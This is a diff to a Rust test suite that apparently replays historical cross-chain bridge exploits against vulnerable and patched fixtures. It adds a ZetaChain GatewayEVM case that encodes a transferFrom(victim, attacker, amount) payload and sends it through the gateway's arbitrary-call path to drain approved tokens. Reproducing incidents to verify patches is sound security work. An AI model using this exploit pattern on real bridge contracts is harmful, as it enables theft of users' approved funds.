@@ -2175,9 +2175,9 @@ mod fixture_tests {
     }
 
     // ---- every official fixture has a deterministic test --------------------
-    const TESTED_FIXTURES: [&str; 8] = [
+    const TESTED_FIXTURES: [&str; 9] = [
         "nomad", "qubit", "feg_bridge_2024", "crosscurve", "ronin_2024", "polynetwork", "verus",
-        "benign_bridge",
+        "benign_bridge", "zetachain_2026",
     ];
 
     #[test]
@@ -2192,6 +2192,39 @@ mod fixture_tests {
         let mut expected: Vec<String> = TESTED_FIXTURES.iter().map(|s| s.to_string()).collect();
         expected.sort();
         assert_eq!(found, expected, "official fixtures and deterministic tests diverged");
+    }
+
+    // ---- held-out incident (ZetaChain GatewayEVM, 2026) ------------------
+    #[test]
+    fn zetachain_2026_official_exploit_and_patch() {
+        // The attacker requests an arbitrary cross-chain call on the source
+        // gateway with transferFrom(victim, attacker, amount) as the payload; the
+        // faithful relay delivers it to the destination gateway's arbitrary-call
+        // branch, which drains the token the victim approved to the gateway.
+        let Some((vuln, patched)) = eval("zetachain_2026", |w| {
+            let token = w.contract("Token").expect("Token deployed").addr;
+            let mut vb = [0u8; 20];
+            vb[18] = 0xAb;
+            vb[19] = 0x01;
+            let victim = Address::from_slice(&vb);
+            let sel = keccak256(b"transferFrom(address,address,uint256)").0;
+            let args = ethers_core::abi::encode(&[
+                addr_tok(victim),
+                addr_tok(attacker()),
+                Token::Uint(parse_uint("500000e18").unwrap()),
+            ]);
+            let mut data = sel[..4].to_vec();
+            data.extend_from_slice(&args);
+            vec![ucall(
+                w,
+                "GatewayZEVM",
+                "call",
+                vec![addr_tok(token), Token::Bytes(data), Token::Bool(true)],
+            )]
+        }) else {
+            return;
+        };
+        assert_exploit("zetachain_2026", &vuln, &patched);
     }
 
     // ---- benign hard-negative (A3) and source-reorg demonstration (A6) -----
